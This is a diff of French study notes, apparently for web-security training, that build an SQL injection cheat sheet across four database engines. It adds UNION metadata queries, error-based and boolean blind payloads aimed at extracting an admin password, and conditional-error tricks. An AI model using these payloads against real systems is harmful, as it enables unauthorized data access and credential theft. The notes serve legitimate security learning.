@@ -24,11 +24,13 @@ Fiche : https://portswigger.net/web-security/sql-injection/cheat-sheet
 - Logique : `or 1=1` toujours **vrai**, `and 1=2` toujours **faux**, `or 1=2` toujours **neutre**
 - Wildcard : `like 'marc%'` avec `%`
 
-| Opération     | Oracle                | MSSQL                    | PgSQL                    | MySQL                                                     |
-| ------------- | --------------------- | ------------------------ | ------------------------ | --------------------------------------------------------- |
-| Commentaire   | `--comm`              | `--comm`<br>`/*comm*/`   | `--comm`<br>`/*comm*/`   | `#comm`<br>`-- comm` (attention espace)<br>`/*comm*/`     |
-| Concaténation | 'a' \|\| 'b'          | `'a' + 'b'`              | 'a' \|\| 'b'             | `'a' 'b'`<br>(attention espace)<br><br>`concat('a', 'b')` |
-| Substring     | `substr('abc', 1, 1)` | `substring('abc', 1, 1)` | `substring('abc', 1, 1)` | `substring('abc', 1, 1)`                                  |
+| Opération     | Oracle                | MSSQL                    | PgSQL                           | MySQL                                                     |
+| ------------- | --------------------- | ------------------------ | ------------------------------- | --------------------------------------------------------- |
+| Commentaire   | `--comm`              | `--comm`<br>`/*comm*/`   | `--comm`<br>`/*comm*/`          | `#comm`<br>`-- comm` (attention espace)<br>`/*comm*/`     |
+| Concaténation | 'a' \|\| 'b'          | `'a' + 'b'`              | 'a' \|\| 'b'                    | `'a' 'b'`<br>(attention espace)<br><br>`concat('a', 'b')` |
+| Substring     | `substr('abc', 1, 1)` | `substring('abc', 1, 1)` | `substring('abc', 1, 1)`        | `substring('abc', 1, 1)`                                  |
+| Ascii         | `ascii(x)`            | `ascii(x)`               | `ascii(x)`                      | `ascii(x)`<br>`ord(x)`                                    |
+| Length        | `length(x)`           | `len(x)`                 | `length(x)`<br>`char_length(x)` | `length(x)`<br>`char_length(x)`                           |
 > Toujours utiliser `-- ` **avec** l'espace.
 
 | Type de donnée                    | Oracle                                                                    | MSSQL                                   | PgSQL                          | MySQL                                                      |
@@ -71,6 +73,37 @@ delete from ma_table
 where col = $var;
 ```
 # Mécanismes de base des SQLi
+## Obtenir les métadonnées
+
+> **But** : obtenir métadonnées du SGBD.
+```sql
+select * from products where category = $var
+```
+
+- `' union select @@version, ..., null--`
+```sql
+select * from products where category = '' union select @@version, ..., null--'
+```
+
+| Métadonnée           | Oracle                                                                     | MSSQL                                                                                                  | PgSQL                                                                                                  | MySQL                                                                                                  |
+| -------------------- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
+| Version              | select banner<br>from v\$version<br><br>select version<br>from v\$instance | select @@version                                                                                       | select version()                                                                                       | select @@version                                                                                       |
+| Listing des tables   | select owner, table_name, tablespace_name from all_tables<br><br>          | select table_catalog, table_schema, table_name, table_type from information_schema.tables              | select table_catalog, table_schema, table_name, table_type from information_schema.tables              | select table_catalog, table_schema, table_name, table_type from information_schema.tables              |
+| Listing des colonnes | select owner, table_name, column_name, data_type from all_tab_columns      | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns |
+- Oracle :
+    - `owner` : utilisateur propriétaire.
+    - `tablespace_name` : stockage physique.
+    - `table_name` : Nom table en majuscules.
+    - `column_name` : Nom colonne en majuscules.
+    - `data_type` : Type de donnée colonne.
+
+- Autre :
+	- `table_catalog` : DB d'appartenance.
+	- `table_schema` : Namespace.
+	- `table_name` : Nom table.
+	- `table_type` : Table de base ou vue.
+	- `column_name` : Nom colonne.
+	- `data_type` : Type de donnée colonne.
 ## Déterminer le schéma de la base
 ### Déterminer le type des colonnes
 
@@ -92,31 +125,8 @@ select * from users where name = '' union select null, 'stringtest'--' and passw
 -- >> pas err : 2e colonne potentiellement un string (dépend de si le string peut se caster)
 
 -- Oracle
-select * from users where name = '' union select 'stringtest', null--' and password = '...'
+select * from users where name = '' union select 'stringtest', null from dual--' and password = '...'
 ```
-## Obtenir les métadonnées
-
-> **But** : obtenir métadonnées du SGBD.
-
-| Métadonnée           | Oracle                                                                     | MSSQL                                                                                                  | PgSQL                                                                                                  | MySQL                                                                                                  |
-| -------------------- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------ |
-| Version              | select banner<br>from v\$version<br><br>select version<br>from v\$instance | select @@version                                                                                       | select version()                                                                                       | select @@version                                                                                       |
-| Listing des tables   | select owner, table_name, tablespace_name from all_tables<br><br>          | select table_catalog, table_schema, table_name, table_type from information_schema.tables              | select table_catalog, table_schema, table_name, table_type from information_schema.tables              | select table_catalog, table_schema, table_name, table_type from information_schema.tables              |
-| Listing des colonnes | select owner, table_name, column_name, data_type from all_tab_columns      | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns | select table_catalog, table_schema, table_name, column_name, data_type from information_schema.columns |
-- Oracle :
-    - `owner` : utilisateur propriétaire.
-    - `tablespace_name` : stockage physique.
-    - `table_name` : Nom table en majuscules.
-    - `column_name` : Nom colonne en majuscules.
-    - `data_type` : Type de donnée colonne.
-
-- Autre :
-	- `table_catalog` : DB d'appartenance.
-	- `table_schema` : Namespace.
-	- `table_name` : Nom table.
-	- `table_type` : Table de base ou vue.
-	- `column_name` : Nom colonne.
-	- `data_type` : Type de donnée colonne.
 ### Compter les colonnes retournées
 #### Par order by
 
@@ -199,6 +209,22 @@ select * from products where category = $var
 ```sql
 select * from products where category = '' union select cast(col1 as varchar) || ' ~ ' || ... || ' ~ ' || cast(coln as varchar), ..., null from t--'
 ```
+### Erreur renvoyant les données
+
+> **But** : Générer un message d'erreur contenant les valeurs.
+```sql
+select * from users where username = $user and password = $pass
+```
+
+- `' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--`
+```sql
+select * from users where username = '' union select 'foo' where 1 = (select password from users where username = 'admin' limit 1), ..., null--' and password = ''
+-- >> Conversion failed when converting the varchar value 'password1234' to datatype int
+```
+
+| Oracle | MSSQL                                          | PgSQL                                            | MySQL                                                                                         |
+| ------ | ---------------------------------------------- | ------------------------------------------------ | --------------------------------------------------------------------------------------------- |
+| /      | select 'foo' where<br>1 = (select ... limit 1) | select cast((<br>select ... limit 1<br>) as int) | select 'foo' where<br>1=1 and extractvalue(<br>1, concat(0x5c, (<br>select ... limit 1<br>))) |
 ### Modifier la table
 
 > **But** : altérer la table.
@@ -215,3 +241,53 @@ update users
 set username = 'value', rank = 'admin'
 where col = '...'
 ```
+# Techniques d'injection à l'aveugle
+
+Techniques utilisées pour remarquer une différence de traitement. Renvoie des résultats booléens sur le SGBD.
+## Par logique
+
+> **But** : Exploiter diffs visuelles en fonction d'une conditionnelle injectée.
+> **Prérequis** : Utiliser **requêtes unicellulaires** pour utiliser comparaisons.
+> **Astuce** : Analyser les diffs sur page avant et après requête.
+> **Astuce** : Énumération explicite.
+```sql
+select * from products where category = $var
+```
+
+- Égalité : `' and (select substring(password, 1, 1) from users where username = 'admin') = 'a'--`
+```sql
+select * from products where category = '' and (select substring(password, 1, 1) from users where username = 'admin') = 'a'--'
+```
+
+- Inégalité (>=, <=) : `' and (select substring(password, 1, 1) from users where username = 'admin') >= 'm'--`
+```sql
+select * from products where category = '' and (select substring(password, 1, 1) from users where username = 'admin') >= 'm'--'
+
+-- Complémentaire de
+select * from products where category = '' and (select substring(password, 1, 1) from users where username = 'admin') < 'm'--'
+```
+
+| Opération                             | Oracle            | MSSQL                         | PgSQL                           | MySQL                                  |
+| ------------------------------------- | ----------------- | ----------------------------- | ------------------------------- | -------------------------------------- |
+| Substring<br>s: start<br>l: length    | `substr(x, s, l)` | `substring(x, s, l)`          | `substring(x, s, l)`            | `substring(x, s, l)`<br>`mid(x, s, l)` |
+| Alternatives à substring<br>l: length | /                 | `left(x, l)`<br>`right(x, l)` | `left(x, l)`<br>`right(x, l)`   | `left(x, l)`<br>`right(x, l)`          |
+| Ascii                                 | `ascii(x)`        | `ascii(x)`                    | `ascii(x)`                      | `ascii(x)`<br>`ord(x)`                 |
+| Length                                | `length(x)`       | `len(x)`                      | `length(x)`<br>`char_length(x)` | `length(x)`<br>`char_length(x)`        |
+## Par erreur
+### Erreur conditionnelle
+
+> **But** : Générer une erreur SQL en fonction d'une condition injectée.
+```sql
+select * from products where category = $var
+```
+
+- `' and (select case when (cond) then 1/0 else null end)--`
+```sql
+select * from products where category = '' and (select case when (cond) then 1/0 else null end)--'
+```
+
+| Oracle                                                                  | MSSQL                                                | PgSQL                                                               | MySQL                                                                              |
+| ----------------------------------------------------------------------- | ---------------------------------------------------- | ------------------------------------------------------------------- | ---------------------------------------------------------------------------------- |
+| select case when<br>(cond) then to_char(1/0)<br>else null end from dual | select case when<br>(cond) then 1/0<br>else null end | 1 = (select case when<br>(cond) then 1/(select 0)<br>else null end) | select if (cond, (select<br>table_name from<br>information_schema.tables),<br>'a') |
+| /                                                                       | select 1/0<br>where cond                             | select 1/(case when<br>(cond) then 0 else<br>1 end)                 | select exp(999 where (cond))                                                       
+## Par délai
